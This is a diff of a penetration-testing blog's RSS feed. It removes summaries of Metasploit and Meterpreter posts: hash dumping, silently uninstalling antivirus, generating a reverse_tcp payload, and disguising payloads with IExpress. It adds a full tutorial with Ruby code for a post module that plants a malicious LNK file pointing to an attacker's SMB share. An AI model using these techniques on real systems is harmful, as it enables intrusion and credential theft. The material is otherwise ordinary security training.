-      <title>Dumping Hashes on Win2k8 R2 x64 with Metasploit</title>
-      <link>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</link>
-      <pubDate>Mon, 16 May 2011 02:35:31 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/</guid>
-      <description>When trying to dump password hashes on a Windows 2008 R2 64 bit box I constantly run into the &amp;ldquo;The parameter is incorrect&amp;rdquo; error in meterpreter. So I&amp;rsquo;ve had to fall back on dropping binaries which I really don&amp;rsquo;t like doing because of the added clean up and chance of getting &amp;lsquo;caught&amp;rsquo;. Well, with a bit of migration you&amp;rsquo;ll be back to passing the hash. Here is how, with a bit of the thought process first:</description>
-    </item>
-    
-    <item>
-      <title>Delicious Webapp Hacking</title>
-      <link>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</link>
-      <pubDate>Sat, 25 Dec 2010 17:00:36 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-12-25-delicious-webapp-hacking/</guid>
-      <description>[UPDATE] This module (enum_delicious) has been pulled from Metasploit since Delicious no longer allows searching by site.
-In the last post I showed off how Archive.org&amp;rsquo;s Wayback machine can be used to pull urls for a domain, another place where URLs are stored and can be searched by domain is Delicious.com (a bookmarking service). I&amp;rsquo;ve seen people bookmark everything from internal web portals to urls with special no-auth passwords in them.</description>
-    </item>
-    
-    <item>
-      <title>Wayback Webapp Hacking</title>
-      <link>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</link>
-      <pubDate>Fri, 24 Dec 2010 19:32:56 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-12-24-wayback-webapp-hacking/</guid>
-      <description>Archive.org allows you to check the history of sites and pages, but a service most are not aware of is one that allows you to get a list of every page that a Archive.org has for a given domain. This is great for enumerating a web applications, many times you&amp;rsquo;ll find parts of web apps that have been long forgotten (and usually vulnerable).
-This module doesn&amp;rsquo;t make any requests to the targeted domain, it simply outputs a list to the screen/or a file of all the pages it has found on Archive.</description>
-    </item>
-    
-    <item>
-      <title>Project Honeypot HTTP Blocklist module</title>
-      <link>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</link>
-      <pubDate>Thu, 23 Dec 2010 23:39:03 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-12-23-project-honeypot-http-blocklist-module/</guid>
-      <description>Most malicious IP lists focus on the client side threat, where servers (hosted or exploited) host client side exploits or evil scripting.
-These don&amp;rsquo;t really help the server admins very much. Project Honeypot does an amazing job at keeping detailed information on scanners / harvesters and brute forcers, the likes of which are the daily enemy of said admins. They offer a service called HTTP Block List or &amp;lsquo;HTTP:BL&amp;rsquo;.
-Another way this list differs from the rest is it isn&amp;rsquo;t a list you can download.</description>
-    </item>
-    
-    <item>
-      <title>Silently uninstall SEP</title>
-      <link>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</link>
-      <pubDate>Tue, 16 Nov 2010 05:00:00 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-11-16-silently-uninstall-sep-html/</guid>
-      <description>Uninstallation is not new
-Deleting and removing things on a box you own isn&amp;rsquo;t new
-This method and how to do it remotely was posted in Feb 2007
-But I didn&amp;rsquo;t know how to do it, and I thought it was hilarious, so I made a video:
- </description>
-    </item>
-    
-    <item>
-      <title>Am I an Admin? Railgun Script</title>
-      <link>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</link>
-      <pubDate>Mon, 13 Sep 2010 17:45:31 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-09-13-am-i-an-admin-railgun-script/</guid>
-      <description>When you first step on a machine, you want to determine quickly if you are just a user or an administrator. Meterpreter doesn&amp;rsquo;t have a way to quickly check this. You could drop to a shell, check the local users group &amp;ldquo;Adminitrators&amp;rdquo;, and check your user, and correlate any groups that are shared between the outputs. You could do &amp;lsquo;getsystem&amp;rsquo; and if one works other than Kitrap0d. You could also just do a &amp;lsquo;ps&amp;rsquo; and notice that you can see &amp;lsquo;SYSTEM&amp;rsquo; processes.</description>
-    </item>
-    
-    <item>
-      <title>Rapid fire PSEXEC for Metasploit</title>
-      <link>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</link>
-      <pubDate>Sun, 12 Sep 2010 15:06:39 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-09-12-rapid-fire-psexec-for-metasploit/</guid>
-      <description>Exploit modules inside of metasploit don&amp;rsquo;t have the ability to run on multiple hosts with one swing of the bat. So I created some code to facilitate that. It&amp;rsquo;s really not much but there are some really juicy pieces of knowledge I learned on the way here.
-// The following is a resource file, but instead of just giving you something to download or straight copy and paste, I&amp;rsquo;ve broken it up into sections.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit turns 10,000</title>
-      <link>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</link>
-      <pubDate>Fri, 13 Aug 2010 16:36:46 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-08-13-metasploit-turns-10000/</guid>
-      <description>Ask any developer and they will tell you that the age of a project is not calculated in calendar time, but in worker hours or &amp;ldquo;commits&amp;rdquo; to a project. The Metasploit Framework hit 10,000 today.
-With the project dating back to 2003, much before the official &amp;ldquo;Revision 1&amp;rdquo; happened, there have been a lot of changes. Going from the initial incarnation as a network &amp;ldquo;game&amp;rdquo; written in perl to the world largest ruby project, the framework has seen it&amp;rsquo;s fair share of blood, sweat, and tears.</description>
-    </item>
-    
-    <item>
-      <title>Intro to RailGun: WIN API for Meterpreter</title>
-      <link>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</link>
-      <pubDate>Thu, 08 Jul 2010 02:10:34 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-07-08-intro-to-railgun-win-api-for-meterpreter/</guid>
-      <description>Back on June 13th, &amp;ldquo;Patrick HVE&amp;rdquo; released RAILGUN:
-http://mail.metasploit.com/pipermail/framework/2010-June/006382.html
-And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712: http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712
-Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:
- iphlpapi ws2_32 kernel32 ntdll user32 advapi32  (You can find out exactly what functions are available by default in the api.</description>
-    </item>
-    
-    <item>
-      <title>Set Wallpaper Meterpreter Script</title>
-      <link>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</link>
-      <pubDate>Mon, 28 Jun 2010 20:34:43 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-06-28-set-wallpaper-meterpreter-script/</guid>
-      <description>Certainly nothing to fuss over, but I&amp;rsquo;ve had a fascination with setting my target&amp;rsquo;s wallpaper as sort of a calling card for years now. I&amp;rsquo;ve been able to set the registry key (HKCUControl PanelDesktopWallpaper), but until recently I didn&amp;rsquo;t know how to get it to refresh so that it displayed without forcing the user to log out&amp;hellip;
-First, is the most important part, selection of the wallpaper. This is my first selection:</description>
-    </item>
-    
-    <item>
-      <title>0Exploit Privilege Escalation</title>
-      <link>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</link>
-      <pubDate>Fri, 07 May 2010 14:05:53 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-05-07-exploit-privilege-escalation/</guid>
-      <description>The other day Chris Gates posted an excellent blog post about the WebDAV hotness that Chris Sullo (author of Nikto) cooked up (DAVTest) which Ryan Linn popped out a Metasploit module for.
-Anyways, the story left off being a very limited user called &amp;ldquo;Network Service&amp;rdquo;. This user has Read and Execute, but no Write access, and a very limited field of view to boot.
-meterpreter &amp;gt; getuid Server username: **NT AUTHORITYNETWORK SERVICE**  Lets look around a bit.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Cyberwarfare</title>
-      <link>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</link>
-      <pubDate>Thu, 01 Apr 2010 16:32:52 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2010/2010-04-01-metasploit-cyberwarfare/</guid>
-      <description>I&amp;rsquo;m not sure I will want to svn up tomorrow. This Cyberwarfare version has advanced powers:</description>
-    </item>
-    
-    <item>
-      <title>Meterpreter tunneling and VNC revamped</title>
-      <link>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</link>
-      <pubDate>Tue, 15 Dec 2009 13:00:37 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-12-15-meterpreter-tunneling-and-vnc-revamped/</guid>
-      <description>So yesterday (December 14th, 2009) HD Moore posted a tweet with a pic of the new VNC meterpreter script that he wrote:
-Looking at the script I noticed that it created a new connection (two connections outbound). Well it was the perfect excuse to take the newly refurbished portfwd command for a spin.
-https://github.com/mubix/stuff/blob/master/metasploit/vnc_oneport.rb
-Or you can get it via the SVN at Revision 7872
-By creating a bind payload instead of a reverse connect we can have the payload listen locally.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit with Ruby 1.9.1</title>
-      <link>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</link>
-      <pubDate>Wed, 09 Dec 2009 13:09:00 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-12-09-metasploit-with-ruby-191/</guid>
-      <description>UPDATE: if you don&amp;rsquo;t make some additional steps, the &amp;lsquo;rvm 1.9.1&amp;rsquo; command only is active for the current console session. See the site for details: http://rvm.beginrescueend.com/
-This short tutorial is how to get Ruby 1.9.1 on BT4 or any other Linux distro with the tool &amp;lsquo;rvm&amp;rsquo; (Ruby Version Manager).
-The Metasploit team has put a lot of work into getting the framework to work well with 1.9.1 and still work with earlier versions.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Blends in: New MSFPayload/ENcode</title>
-      <link>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</link>
-      <pubDate>Tue, 03 Nov 2009 03:47:20 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/</guid>
-      <description>In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
-But before I get into the new feature, lets quickly go over the standard way you use msfencode:
-root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.</description>
-    </item>
-    
-    <item>
-      <title>Packet Captures with Meterpreter - 7zip - WinDump - and Nmap-ish</title>
-      <link>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</link>
-      <pubDate>Sat, 03 Oct 2009 02:24:05 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-10-03-packet-captures-with-meterpreter-7zip-windump-and-nmap-ish/</guid>
-      <description>So this is a pretty crafty way of getting packet captures on a target system. Definitely could be streamlined with some meterpreter scripting fu, but awesome job on the video.
- Metasploit meterpreter Windump/Winpcap sniffer from siles on Vimeo.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Framework as a Payload</title>
-      <link>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</link>
-      <pubDate>Fri, 26 Jun 2009 05:45:08 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-06-26-metasploit-framework-as-a-payload/</guid>
-      <description>Well, sorta…
-I created a meterpreter script that takes the cygwin bundled version of Metasploit inside of a NullSoft installer that HD Moore created and deploys it using meterpreter to the compromised host, extracts/installs it, and runs the shell. Now I left this intentionally open so that you could package your own cygwin bundle (possibly with nmap and netcat), for your own evil fun.
-Thanks defintely go to Carlos Perez (Dark0perator) and HD Moore for their help getting this bad boy working right.</description>
-    </item>
-    
-    <item>
-      <title>PassiveX fun with Metasploit</title>
-      <link>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</link>
-      <pubDate>Wed, 10 Jun 2009 13:21:05 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-06-10-passivex-fun-with-metasploit/</guid>
-      <description>I posted this walkthrough to the Metasploit mailing list, but thought that it would serve well here as well. Especially with the recent iPhone 3.0 “Special” download spam I recently received. The binary comes out to a whopping 97 bytes for the stager. Would be a blazing fast download and coupled with the IExpress “hack” would make for an very hard to spot payload.
-A really down and dirty explination of what PassiveX is and why it&amp;rsquo;s useful in this sort of situation is that instead of making a direct connection back to you, it uses an iexplorer process with a cool ActiveX control to talk back.</description>
-    </item>
-    
-    <item>
-      <title>Metasploit &lt;3s Microsoft</title>
-      <link>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</link>
-      <pubDate>Mon, 09 Mar 2009 22:03:27 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-03-09-metasploit-3s-microsoft/</guid>
-      <description>Update to post: Metasploit Heart&amp;rsquo;s Microsoft
-Ok, so many people had issues with the Vimeo video, that I posted it to youtube in hopes that you&amp;rsquo;ll be able to play it all the way through. I still have no idea what the issue is, it&amp;rsquo;s played perfectly on all the computers that I&amp;rsquo;ve tried it on.
- </description>
-    </item>
-    
-    <item>
-      <title>Metasploit heart&#39;s Microsoft</title>
-      <link>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</link>
-      <pubDate>Mon, 02 Mar 2009 19:24:23 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-03-02-metasploit-hearts-microsoft/</guid>
-      <description>Hiding Meterpreter with IExpress from mubix on Vimeo.
-Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it&amp;rsquo;s easyier to dupe, or a different malicious executable (leekspin perhaps?</description>
-    </item>
-    
-    <item>
-      <title>Metasploit Across the Net</title>
-      <link>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</link>
-      <pubDate>Wed, 04 Feb 2009 18:13:00 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2009/2009-02-04-metasploit-across-the-net/</guid>
-      <description>Metasploit is awesome, but some don’t know that their are updates all the time via SVN, and even fewer know of places to get good non-svn modules / scripts. Here are a few of my favorites:
- https://www.securinfos.info/metasploit/msfxdc.php
- http://metasploit.com/users/mc/
- http://darkoperator.blogspot.com
-  &amp;ndash; newly added, check out the CookieMonster script and a host of others:
- http://pentest.cryptocity.net
-  And of course: http://carnal0wnage.blogspot.com/</description>
+      <description>&lt;p&gt;I have been using the LNK trick I talked about in my &lt;a href=&#34;https://malicious.link/blog/2012/02/11/ms08_068-ms10_046-fun-until-2018&#34;&gt;last post&lt;/a&gt; for a while, but always needing a Windows machine to create the LNK file. When I decided to write a post about it, I wanted to put the stipulation for myself that I would finally develop a way to get it done with out having to lug around a VM or spin one up every time I needed to change it&amp;rsquo;s target.&lt;/p&gt;
+
+&lt;p&gt;Of course the first place I looked was Meterpreter&amp;rsquo;s Railgun (direct windows API calling within meterpreter). But to do it with Railgun I would have to develop a way to &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/aa969393.aspx&#34;&gt;work with COM objects&lt;/a&gt;. Something that I don’t believe is built into Railgun (yet… /me nudges chao-mu). The second place I looked was to see if I could just build an LNK file from scratch &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/dd871305(PROT.10).aspx&#34;&gt;using the spec&lt;/a&gt;.. ya…. that didn’t go so..*zzzZZZzzzzzzzZzzz&lt;/p&gt;
+
+&lt;p&gt;Enter &lt;a href=&#34;http://redmine.corelan.be/projects/mona&#34;&gt;mona&lt;/a&gt;, the &lt;a href=&#34;http://www.corelan.be/&#34;&gt;Corelan Team’s&lt;/a&gt; exploit development plugin for &lt;a href=&#34;http://immunityinc.com/products-immdbg.shtml&#34;&gt;Immunity Debugger&lt;/a&gt;. Now, usually it is used exactly as intended, as an exploit development tool, and I guess you could consider my use of it as an extension of that as well. But, anyways, one of Mona’s many and probably one of the least well known functions is ‘header’. What this function does is simply output a ruby version of the file broken into ASCII and binary parts. That’ll make much more sense in a sec, back to the problem. I need to recreate a file in a way I can manipulate it on the fly with enough agility to be useful to others in a post module without using the spec or Railgun to assist.&lt;/p&gt;
+
+&lt;p&gt;We start off with the maliciously altered LNK file, and an up to date version of Immunity and mona:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I copied the shortcut file to the C drive so I didn’t have to specify a huge path in the mona command, and issued:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;“!mona header C:\autoexec.lnk”&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/postimages/201202_mona_2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see, mona breaks up the binary into ‘understandable’ portions, so if it sees a string is keeps it together, if it sees unicode, it actually uses the Rex ruby libraries. You can try it yourself and scroll through the results but when I saw:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;header &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;C:\%\\\\192.168.100.100\\w00t\\bogusimage.png`&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I knew I was golden. Quick note: pay close attention when you edit the output of this command in a text editor, initially I didn’t notice the ‘tick’ ( ` ) at the end of the share string and it cause me a lot of grief.&lt;/p&gt;
+
+&lt;p&gt;Cool, so I have a bit of ruby that puts the contents of my LNK file into a ruby variable. Now what?&lt;/p&gt;
+
+&lt;p&gt;Now I have 3 challenges:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It needs to have a user defined target IP at the very least and anything else I work into a variable option for the user.&lt;/li&gt;
+&lt;li&gt;It needs to upload the file to the exploited system.&lt;/li&gt;
+&lt;li&gt;It needs to be up to code on the Metasploit coding standards&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Changing the line I found for the share name into this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;lnk &amp;lt;&amp;lt; Rex::Text.to_unicode(&amp;quot;\\\\#{datastore[&#39;LHOST&#39;]}\\#{datastore[&#39;SHARENAME&#39;]}\\#{datastore[&#39;ICONFILENAME&#39;]}`&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;‘datastore’ is used as the container for variable set by default or by the user using the module. Adding those option for the user is pretty easy. You just add the following to the ‘register_options’ section of your module:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;OptAddressRange.new(&amp;quot;LHOST&amp;quot;, [ true, &amp;quot;Host listening for incoming SMB/WebDAV traffic&amp;quot;, nil]),
+OptString.new(&amp;quot;SHARENAME&amp;quot;, [ true, &amp;quot;Share name on LHOST&amp;quot;, &amp;quot;share1&amp;quot;]),       
+OptString.new(&amp;quot;ICONFILENAME&amp;quot;, [ true, &amp;quot;File name on LHOST&#39;s share&amp;quot;, &amp;quot;icon.png&amp;quot;])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;OptAddressRange is used instead of a string because it has a bit of validation that you are actually using something that either resembles an IP address or a hostname.&lt;/p&gt;
+
+&lt;p&gt;Problem 1 solved. Problem 2 was just as easy, the following line:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;file = client.fs.file.new(datastore[&#39;LNKFILENAME&#39;], &#39;wb&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;creates a new file on the victim, and ‘file.write(lnk)’ writes the binary contents of the ‘lnk’ variable into it.&lt;/p&gt;
+
+&lt;p&gt;Problem 3 is much more tricky, but here is the path to wisdom:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ruby /metasploit-directory/tools/msftidy.rb /path/to/my/module/evil.rb
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Hope this helps spur people into trying their hand at developing some modules of their own.&lt;/p&gt;
+</description>
     </item>
     
   </channel>
